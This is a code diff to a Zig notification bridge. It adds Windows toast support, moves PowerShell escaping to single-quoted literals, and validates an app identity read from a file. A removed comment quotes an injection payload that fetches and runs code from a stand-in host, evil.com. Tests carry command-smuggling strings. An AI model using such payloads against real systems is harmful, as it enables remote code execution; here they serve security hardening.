@@ -11,6 +11,7 @@ const ios_async = @import("ios_async.zig");
 
 const BridgeError = bridge_error.BridgeError;
 const log = logging.notification;
+extern "kernel32" fn GetModuleFileNameW(?*anyopaque, [*]u16, c_ulong) callconv(.c) c_ulong;
 
 // UNUserNotificationCenter requires a completion block even when Craft only
 // wants to trigger its first-run prompt. A global block never needs heap copy
@@ -108,6 +109,14 @@ pub const NotificationBridge = struct {
     pub fn handleLinuxDesktop(self: *Self, action: []const u8, data: []const u8) !void {
         if (std.mem.eql(u8, action, "schedule") or std.mem.eql(u8, action, "show"))
             return self.linuxShowNotification(data);
+        if (std.mem.eql(u8, action, "requestPermission")) return self.requestPermission();
+        return BridgeError.UnknownAction;
+    }
+
+    /// The MSI-backed desktop bridge supports immediate toasts and a permission
+    /// query. Scheduling/cancellation need a separate Windows implementation.
+    pub fn handleWindowsDesktop(self: *Self, action: []const u8, data: []const u8) !void {
+        if (std.mem.eql(u8, action, "show")) return self.windowsShowNotification(data);
         if (std.mem.eql(u8, action, "requestPermission")) return self.requestPermission();
         return BridgeError.UnknownAction;
     }
@@ -591,62 +600,57 @@ pub const NotificationBridge = struct {
 
         log.debug("Windows show: title={s}, body={s}", .{ title, body });
 
-        // Build the PowerShell script safely.
-        //
-        // CRITICAL: the previous implementation interpolated `title` and `body`
-        // directly into a PowerShell script as unquoted bytes. A title like
-        // `"));Invoke-Expression("curl evil.com/x | iex` executed arbitrary
-        // PowerShell with user privileges — a remote code execution vector
-        // driven by any JS that could call this notification API.
-        //
-        // Fix: escape every PowerShell double-quoted string special:
-        //   `"`  -> `""`   (PS double-quote escape within `"..."`)
-        //   `` ` `` -> `` `` `` (PS backtick escape)
-        //   `$`  -> `` `$ ``   (prevents variable expansion)
-        const title_esc = try escapePsDoubleQuoted(self.allocator, title);
+        // Single-quoted PowerShell literals have no interpolation. Only an
+        // apostrophe needs escaping (by doubling it); control bytes are dropped.
+        const title_esc = try escapePsSingleQuoted(self.allocator, title);
         defer self.allocator.free(title_esc);
-        const body_esc = try escapePsDoubleQuoted(self.allocator, body);
+        const body_esc = try escapePsSingleQuoted(self.allocator, body);
         defer self.allocator.free(body_esc);
+        const app_id = try windowsNotificationAppId(self.allocator);
+        defer self.allocator.free(app_id);
 
         const ps_script = try std.fmt.allocPrint(self.allocator,
+            \\$ErrorActionPreference = 'Stop'
             \\[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] > $null
             \\$template = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText02)
             \\$textNodes = $template.GetElementsByTagName("text")
-            \\$textNodes.Item(0).AppendChild($template.CreateTextNode("{s}")) > $null
-            \\$textNodes.Item(1).AppendChild($template.CreateTextNode("{s}")) > $null
+            \\$textNodes.Item(0).AppendChild($template.CreateTextNode('{s}')) > $null
+            \\$textNodes.Item(1).AppendChild($template.CreateTextNode('{s}')) > $null
             \\$toast = [Windows.UI.Notifications.ToastNotification]::new($template)
-            \\[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("Craft App").Show($toast)
-        , .{ title_esc, body_esc });
+            \\$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier('{s}')
+            \\if ($null -eq $notifier) {{ throw 'Toast notifier was unavailable' }}
+            \\$notifier.Show($toast)
+        , .{ title_esc, body_esc, app_id });
         defer self.allocator.free(ps_script);
 
         const io = io_context.get();
         var child = std.process.spawn(io, .{
-            .argv = &.{ "powershell", "-NoProfile", "-NonInteractive", "-Command", ps_script },
+            .argv = &.{ "powershell.exe", "-NoProfile", "-NonInteractive", "-Command", ps_script },
             .stdout = .ignore,
             .stderr = .ignore,
             .stdin = .ignore,
         }) catch |err| {
-            log.debug("powershell spawn failed: {}", .{err});
-            return;
+            log.warn("powershell spawn failed: {}", .{err});
+            return BridgeError.NativeCallFailed;
         };
-        _ = child.wait(io) catch |err| {
-            log.debug("powershell wait failed: {}", .{err});
+        const term = child.wait(io) catch |err| {
+            log.warn("powershell wait failed: {}", .{err});
+            return BridgeError.NativeCallFailed;
         };
+        if (term != .exited or term.exited != 0) return BridgeError.NativeCallFailed;
 
         log.debug("Windows: notification sent", .{});
     }
 
-    /// Escape a string so it's safe to embed inside a PowerShell double-quoted
-    /// literal (`"..."`). The caller owns the returned buffer.
-    fn escapePsDoubleQuoted(allocator: std.mem.Allocator, s: []const u8) ![]u8 {
+    /// Escape a string so it's safe to embed inside a PowerShell single-quoted
+    /// literal (`'...'`). The caller owns the returned buffer.
+    fn escapePsSingleQuoted(allocator: std.mem.Allocator, s: []const u8) ![]u8 {
         var out: std.ArrayListUnmanaged(u8) = .empty;
         errdefer out.deinit(allocator);
 
         for (s) |c| {
             switch (c) {
-                '"' => try out.appendSlice(allocator, "\"\""),
-                '`' => try out.appendSlice(allocator, "``"),
-                '$' => try out.appendSlice(allocator, "`$"),
+                '\'' => try out.appendSlice(allocator, "''"),
                 // Drop control bytes — these can terminate the command line on
                 // Windows (e.g. CR/LF) and have no legitimate role in a
                 // notification title.
@@ -670,6 +674,67 @@ pub const NotificationBridge = struct {
         self.pending_callbacks.deinit();
     }
 };
+
+fn validWindowsAppId(value: []const u8) bool {
+    if (value.len == 0 or value.len > 128) return false;
+    for (value) |byte| {
+        if (!std.ascii.isAlphanumeric(byte) and byte != '.' and byte != '_' and byte != '-') return false;
+    }
+    return true;
+}
+
+/// Read the exact identity the MSI assigned to its Start-menu shortcut.
+/// Guessing from the executable name would collide for apps from different
+/// publishers, and a hardcoded Craft identity would send every app's toasts
+/// through the same shortcut.
+fn windowsNotificationAppId(allocator: std.mem.Allocator) ![]u8 {
+    if (comptime builtin.os.tag != .windows) return BridgeError.NativeCallFailed;
+
+    var exe_wide: [32768]u16 = undefined;
+    const count = GetModuleFileNameW(null, exe_wide[0..].ptr, @intCast(exe_wide.len));
+    if (count == 0 or count >= exe_wide.len) return BridgeError.NativeCallFailed;
+    const exe = try std.unicode.utf16LeToUtf8Alloc(allocator, exe_wide[0..count]);
+    defer allocator.free(exe);
+    const dir = std.fs.path.dirname(exe) orelse return BridgeError.NativeCallFailed;
+    const path = try std.fs.path.join(allocator, &.{ dir, "craft-notification-id.txt" });
+    defer allocator.free(path);
+    const io = io_context.get();
+    var file = std.Io.Dir.cwd().openFile(io, path, .{}) catch return BridgeError.NativeCallFailed;
+    defer file.close(io);
+    const stat = file.stat(io) catch return BridgeError.NativeCallFailed;
+    if (stat.size == 0 or stat.size > 128) return BridgeError.NativeCallFailed;
+    const contents = try allocator.alloc(u8, @intCast(stat.size));
+    defer allocator.free(contents);
+    var read: usize = 0;
+    while (read < contents.len) {
+        const n = file.readStreaming(io, &.{contents[read..]}) catch return BridgeError.NativeCallFailed;
+        if (n == 0) return BridgeError.NativeCallFailed;
+        read += n;
+    }
+    const app_id = std.mem.trim(u8, contents, "\r\n");
+    if (!validWindowsAppId(app_id)) return BridgeError.NativeCallFailed;
+    return allocator.dupe(u8, app_id);
+}
+
+test "Windows notification identities reject PowerShell metacharacters" {
+    try std.testing.expect(validWindowsAppId("Craft.11223344-5566-7788-99AA-BBCCDDEEFF00"));
+    try std.testing.expect(!validWindowsAppId(""));
+    try std.testing.expect(!validWindowsAppId("Craft.App'; exit 0; '"));
+    try std.testing.expect(!validWindowsAppId("Craft.App\n"));
+}
+
+test "Windows toast text is a literal PowerShell string" {
+    const escaped = try NotificationBridge.escapePsSingleQuoted(std.testing.allocator, "don't expand $env:TEMP `tick\n");
+    defer std.testing.allocator.free(escaped);
+    try std.testing.expectEqualStrings("don''t expand $env:TEMP `tick ", escaped);
+}
+
+test "Windows desktop notification dispatch refuses unsupported actions" {
+    if (comptime builtin.os.tag != .windows) return;
+    var bridge = NotificationBridge.init(std.testing.allocator);
+    defer bridge.deinit();
+    try std.testing.expectError(BridgeError.UnknownAction, bridge.handleWindowsDesktop("cancel", ""));
+}
 
 test "Linux desktop notification dispatch refuses unsupported actions" {
     if (comptime builtin.os.tag != .linux) return;
